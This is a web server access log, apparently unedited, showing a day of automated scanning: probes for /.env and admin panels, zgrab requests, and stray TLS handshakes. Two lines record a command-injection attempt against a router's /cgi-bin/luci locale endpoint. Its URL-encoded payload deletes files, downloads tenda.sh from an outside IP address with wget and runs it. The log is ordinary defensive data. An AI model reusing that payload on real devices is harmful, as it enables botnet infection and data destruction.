64.62.197.40 - - [16/Feb/2024:09:53:18 +0000] "GET /geoserver/web/ HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
192.241.235.11 - - [16/Feb/2024:12:38:05 +0000] "GET /version HTTP/1.1" 404 184 "-" "Mozilla/5.0 zgrab/0.x"
54.37.79.75 - - [16/Feb/2024:12:39:18 +0000] "GET /.env HTTP/1.1" 404 181 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [16/Feb/2024:12:39:18 +0000] "POST / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.11.89 - - [16/Feb/2024:13:01:48 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
192.241.225.56 - - [16/Feb/2024:13:09:03 +0000] "GET /druid/index.html HTTP/1.1" 404 118 "-" "Mozilla/5.0 zgrab/0.x"
45.79.163.53 - - [16/Feb/2024:13:16:31 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.51 - - [16/Feb/2024:13:23:10 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03N\xBE\xCF,>\xFD\xA0\xF8\x97Q\xCB\xE0Bs\x95\xA5\xDB\x01\x06\xFB\x9F\xB0@\xD7\x1A\xCA\xE6bU\xF6Tb\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
143.110.222.166 - - [16/Feb/2024:13:28:17 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.74.56.46 - - [16/Feb/2024:14:05:03 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
64.62.197.187 - - [16/Feb/2024:14:24:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x15\x17\xFD\x916\x8C\xE6\x07\x9A\xCD\x91\xC4Z0\x07\xF5\xD2\x96E\x98\x81\xD2\xA31\x14z\x1F\x93\xCD\xFD\xAF\x96\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
143.110.222.166 - - [16/Feb/2024:14:29:11 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.32.206.49 - - [16/Feb/2024:14:29:39 +0000] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03\xD5\xC4^r~qF\x08\xE2\xCD\xFA\x8A\xC8Lsq\xE9\xF2w\xC1\x83<\xD1pDG\xEB\xF1V,\xDD\x08 \x93\xE0\xF5\x9Avds\xB3M\xF6`\xB3\xFA\x87\xE6\xCE\xF4\xD2\xC2y^JS\xFD\x91J\x85\xDD\x8F\xD2Tt\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 150 "-" "-"
152.32.206.49 - - [16/Feb/2024:14:29:50 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
152.32.206.49 - - [16/Feb/2024:14:30:10 +0000] "GET /favicon.ico HTTP/1.1" 404 181 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.206.49 - - [16/Feb/2024:14:30:11 +0000] "GET /robots.txt HTTP/1.1" 404 181 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.206.49 - - [16/Feb/2024:14:30:13 +0000] "GET /sitemap.xml HTTP/1.1" 404 181 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
185.224.128.55 - - [16/Feb/2024:14:41:53 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.10 - - [16/Feb/2024:14:43:45 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
165.154.221.151 - - [16/Feb/2024:14:49:50 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.221.151 - - [16/Feb/2024:14:50:10 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.221.151 - - [16/Feb/2024:14:50:13 +0000] "GET /robots.txt HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.221.151 - - [16/Feb/2024:14:50:15 +0000] "GET /sitemap.xml HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
185.180.143.48 - - [16/Feb/2024:14:50:42 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.177 - - [16/Feb/2024:14:51:12 +0000] "GET /.env HTTP/1.1" 404 181 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [16/Feb/2024:14:51:12 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Q-\xFCTf\xB7\xBCEP\x8B?\xD3\x8DP\x95K\x10\x15X\x9A^\xE5f!\x02\xDCM\xE5\xB4\x0F\xA3\xA6 \xD4+9\x07/\xC2L\xD4q\x13\x9A]\x02\xC7\xB7H\x9F\x93\x22wR\x1C$\xD1a\x9F\x87i.T$b\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 150 "-" "-"
45.79.8.217 - - [16/Feb/2024:14:53:27 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Zoom 3.6.0; rv:11.0) like Gecko"
185.224.128.10 - - [16/Feb/2024:14:54:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.142.214.108%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
185.224.128.10 - - [16/Feb/2024:14:54:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.142.214.108%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
141.98.11.89 - - [16/Feb/2024:14:55:19 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
69.164.217.74 - - [16/Feb/2024:14:56:38 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 zgrab/0.x"
